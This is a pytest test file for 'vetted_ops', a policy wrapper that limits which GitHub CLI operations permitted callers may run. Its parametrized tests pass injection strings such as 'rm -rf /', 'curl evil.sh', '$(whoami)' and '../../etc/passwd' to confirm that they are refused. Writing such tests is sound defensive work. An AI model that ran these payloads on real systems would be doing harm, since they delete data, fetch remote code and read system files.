#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# "License"); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
from __future__ import annotations

from pathlib import Path

import pytest

from vetted_ops import cli, config, ops

CONFIG_TOML = """
workspace = "{workspace}"

[repos]
tracker = "acme/tracker"
upstream = "acme/product"

[values]
labels = ["needs triage", "cve allocated"]
milestones = ["1.2.3"]
assignees = ["alice"]
issue_states = ["open", "closed", "all"]
close_reasons = ["completed", "not planned"]
board_project_id = "PVT_proj"
board_status_field_id = "PVTSSF_field"

[values.board_columns]
"Assessed" = "opt_assessed"

[callers]
"security-issue-sync" = ["issue-view", "issue-add-label", "issue-comment", "issue-close"]
"security-issue-triage" = ["issue-view"]
"""


@pytest.fixture()
def policy(tmp_path: Path) -> config.Config:
    workspace = tmp_path / "scratch"
    workspace.mkdir()
    cfg_path = tmp_path / "config.toml"
    cfg_path.write_text(CONFIG_TOML.format(workspace=workspace))
    return config.load(cfg_path)


def run(argv: list[str], cfg_path: Path) -> int:
    return cli.main([*argv, "--config", str(cfg_path)])


# --- the catalogue is closed -------------------------------------------------


def test_every_op_declares_validators_for_all_its_params() -> None:
    """A parameter with no validator would fall through unchecked."""
    known = {"number", "comment_id", "ref", "base", "head", "prefix", "path", "login", "ghsa", "item_id"}
    for op in ops.OPS.values():
        for param in op.params:
            assert param in known or param in op.enums or param in op.body_files, (
                f"{op.name}: parameter {param!r} has no validator"
            )


def test_every_builder_produces_a_gh_argv(policy: config.Config) -> None:
    """No operation may invoke anything other than gh."""
    sample = {
        "number": "1",
        "comment_id": "1",
        "ref": "main",
        "base": "main",
        "head": "v1",
        "prefix": "v1",
        "path": "a/b.py",
        "login": "alice",
        "ghsa": "GHSA-aaaa-bbbb-cccc",
        "item_id": "PVTI_abc",
        "label": "needs triage",
        "milestone": "1.2.3",
        "state": "open",
        "reason": "completed",
        "column": "Assessed",
        "body": "unused",
    }
    body = policy.workspace / "body.md"
    body.write_text("x")
    for op in ops.OPS.values():
        params = {p: (str(body) if p in op.body_files else sample[p]) for p in op.params}
        argv = op.build(policy.as_mapping(), **params)
        assert argv[0] == "gh", op.name
        assert all(isinstance(a, str) for a in argv), op.name


# --- parameters can never become commands ------------------------------------


@pytest.mark.parametrize(
    "hostile",
    [
        "1; rm -rf /",
        "1 && curl evil.sh",
        "$(whoami)",
        "`id`",
        "1\nrm -rf /",
        "../../etc/passwd",
        "1|tee /tmp/x",
    ],
)
def test_hostile_numbers_are_refused(policy: config.Config, hostile: str) -> None:
    with pytest.raises(ops.ParamError):
        ops.number(hostile)


def test_parameters_may_not_start_with_a_dash(policy: config.Config) -> None:
    """Blocks flag injection — e.g. sneaking --body or --repo into gh."""
    op = ops.resolve("issue-view")
    with pytest.raises(ops.ParamError, match="may not start with"):
        cli._validate_params(op, ["--repo"], policy)


def test_label_must_be_one_of_the_configured_values(policy: config.Config) -> None:
    op = ops.resolve("issue-add-label")
    with pytest.raises(ops.ParamError, match="not one of the configured values"):
        cli._validate_params(op, ["7", "arbitrary-label"], policy)


def test_configured_label_is_accepted(policy: config.Config) -> None:
    op = ops.resolve("issue-add-label")
    params = cli._validate_params(op, ["7", "cve allocated"], policy)
    argv = cli.build_argv(op, params, policy)
    assert argv == [
        "gh",
        "issue",
        "edit",
        "7",
        "--repo",
        "acme/tracker",
        "--add-label",
        "cve allocated",
    ]


# --- body files: content is free, location is not ----------------------------


def test_body_file_outside_the_workspace_is_refused(policy: config.Config, tmp_path: Path) -> None:
    secret = tmp_path / "id_rsa"
    secret.write_text("PRIVATE KEY")
    op = ops.resolve("issue-comment")
    with pytest.raises(ops.ParamError, match="must live under the workspace"):
        cli._validate_params(op, ["7", str(secret)], policy)


def test_body_file_content_may_contain_anything(policy: config.Config) -> None:
    """The body is passed by reference, so shell metacharacters are just text."""
    body = policy.workspace / "note.md"
    body.write_text("`id` $(whoami) && rm -rf / ; drop table\n")
    op = ops.resolve("issue-comment")
    params = cli._validate_params(op, ["7", str(body)], policy)
    argv = cli.build_argv(op, params, policy)
    assert argv[-2:] == ["--body-file", str(body.resolve())]


# --- per-caller scoping ------------------------------------------------------


def test_caller_may_not_run_an_operation_outside_its_manifest(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    workspace = tmp_path / "scratch"
    workspace.mkdir()
    cfg_path = tmp_path / "config.toml"
    cfg_path.write_text(CONFIG_TOML.format(workspace=workspace))

    rc = run(["--caller", "security-issue-triage", "issue-close", "7", "completed"], cfg_path)
    assert rc == cli.EXIT_POLICY
    assert "not permitted to run" in capsys.readouterr().err


def test_unknown_caller_is_refused(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    workspace = tmp_path / "scratch"
    workspace.mkdir()
    cfg_path = tmp_path / "config.toml"
    cfg_path.write_text(CONFIG_TOML.format(workspace=workspace))

    rc = run(["--caller", "not-a-skill", "issue-view", "7"], cfg_path)
    assert rc == cli.EXIT_POLICY
    assert "not declared in the config" in capsys.readouterr().err


def test_permitted_caller_reaches_dry_run(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    workspace = tmp_path / "scratch"
    workspace.mkdir()
    cfg_path = tmp_path / "config.toml"
    cfg_path.write_text(CONFIG_TOML.format(workspace=workspace))

    rc = run(["--caller", "security-issue-sync", "issue-view", "7", "--dry-run"], cfg_path)
    assert rc == cli.EXIT_OK
    assert "gh issue view 7 --repo acme/tracker" in capsys.readouterr().out


def test_caller_is_required(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    workspace = tmp_path / "scratch"
    workspace.mkdir()
    cfg_path = tmp_path / "config.toml"
    cfg_path.write_text(CONFIG_TOML.format(workspace=workspace))

    rc = run(["issue-view", "7"], cfg_path)
    assert rc == cli.EXIT_USAGE
    assert "--caller is required" in capsys.readouterr().err


# --- the repo is policy, not a parameter -------------------------------------


def test_repo_cannot_be_influenced_by_a_parameter(policy: config.Config) -> None:
    op = ops.resolve("issue-view")
    params = cli._validate_params(op, ["7"], policy)
    argv = cli.build_argv(op, params, policy)
    assert argv[argv.index("--repo") + 1] == "acme/tracker"


def test_config_rejects_a_malformed_repo(tmp_path: Path) -> None:
    cfg_path = tmp_path / "bad.toml"
    cfg_path.write_text('workspace = "."\n[repos]\ntracker = "not a repo"\nupstream = "a/b"\n')
    with pytest.raises(config.ConfigError, match="owner/name"):
        config.load(cfg_path)
